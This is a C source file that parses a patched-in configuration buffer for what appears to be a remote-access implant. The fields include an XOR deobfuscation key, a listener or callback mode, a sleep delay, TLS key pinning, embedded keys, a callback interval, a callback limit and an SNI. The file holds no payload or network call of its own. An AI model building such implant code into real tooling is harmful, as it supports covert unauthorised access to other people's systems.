#include <stdio.h>
#include <string.h>
#include "patch.h"
#include "endianness.h"

static const unsigned char buffer[STAMPED_BUFFER_LEN + 1] =
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

/* if mode was callback, extract required callback args ie interval, max cb attempts, and sni */
static bool parse_callback_args(stamped_config_t *config, uint32_t index)
{
    bool status = false;

    if (NULL == config)
    {
        goto exit;
    }

    /* extract interval, maximum callbacks and sni length */
    if ((STAMPED_BUFFER_LEN - index) < (sizeof(uint16_t) + sizeof(uint8_t) + sizeof(uint8_t)))
    {
        goto exit;
    }

    Slice sl_interval = {0};
    if (SL_OK != slice_new(&sl_interval, &buffer[index], sizeof(unsigned char), sizeof(uint16_t)))
    {
        goto exit;
    }

    if (!u16_swap_from_slice(&sl_interval, &config->interval))
    {
        goto exit;
    }
    index += sizeof(uint16_t);

    config->max_cb = buffer[index];
    index += sizeof(uint8_t);

    uint8_t sni_len = buffer[index];
    index += sizeof(uint8_t);

    if ((STAMPED_BUFFER_LEN - index) < sni_len)
    {
        goto exit;
    }

    if (SL_OK != slice_new(&config->sni, &buffer[index], sni_len, sizeof(unsigned char)))
    {
        goto exit;
    }

    status = true;

exit:
    return status;
}

bool parse_config(stamped_config_t *config)
{
    bool status = false;
    uint32_t index = 0;

    if (NULL == config)
    {
        return false;
    }

    /* extract xor key that will be used to debofs slice data */
    config->key = buffer[index];
    index += sizeof(unsigned char);

    /* extract configuration mode, ie listener or callback */
    config->mode = buffer[index];
    index += sizeof(unsigned char);

    /* extract sleep time before any action takes place, ie bind or connect */
    config->sleep = buffer[index];
    index += sizeof(unsigned char);

    /* extract and convert port from network to host order */
    Slice sl_port = {0};
    if (SL_OK != slice_new(&sl_port, &buffer[index], sizeof(unsigned char), sizeof(uint16_t)))
    {
        goto exit;
    }

    if (!u16_swap_from_slice(&sl_port, &config->port))
    {
        goto exit;
    }
    index += sizeof(uint16_t);

    /* extract and store spki hash */
    if (SL_OK != slice_new(&config->spki, &buffer[index], SPKI_HASH_LEN, sizeof(unsigned char)))
    {
        goto exit;
    }
    index += SPKI_HASH_LEN;

    /* extract address, public key, and private key lengths */
    uint8_t addr_len = buffer[index];
    index += sizeof(unsigned char);

    Slice sl_pubkey = {0};
    if (SL_OK != slice_new(&sl_pubkey, &buffer[index], sizeof(unsigned char), sizeof(uint16_t)))
    {
        goto exit;
    }

    uint16_t pub_len = 0;
    if (!u16_swap_from_slice(&sl_pubkey, &pub_len))
    {
        goto exit;
    }
    index += sizeof(uint16_t);

    Slice sl_privkey = {0};
    if (SL_OK != slice_new(&sl_privkey, &buffer[index], sizeof(unsigned char), sizeof(uint16_t)))
    {
        goto exit;
    }

    uint16_t priv_len = 0;
    if (!u16_swap_from_slice(&sl_privkey, &priv_len))
    {
        goto exit;
    }
    index += sizeof(uint16_t);

    /* extract address, public key and private key */
    if ((STAMPED_BUFFER_LEN - index) < addr_len + pub_len + priv_len)
    {
        goto exit;
    }

    if (SL_OK != slice_new(&config->address, &buffer[index], addr_len, sizeof(unsigned char)))
    {
        goto exit;
    }
    index += addr_len;

    if (SL_OK != slice_new(&config->public_key, &buffer[index], pub_len, sizeof(unsigned char)))
    {
        goto exit;
    }
    index += pub_len;

    if (SL_OK != slice_new(&config->private_key, &buffer[index], priv_len, sizeof(unsigned char)))
    {
        goto exit;
    }
    index += priv_len;

    /* if callback was specified, extract the interval, maximum callbacks permitted, and server sni */
    if (CALLBACK == config->mode)
    {
        if (!parse_callback_args(config, index))
        {
            goto exit;
        }
    }

    status = true;

exit:
    return status;
}
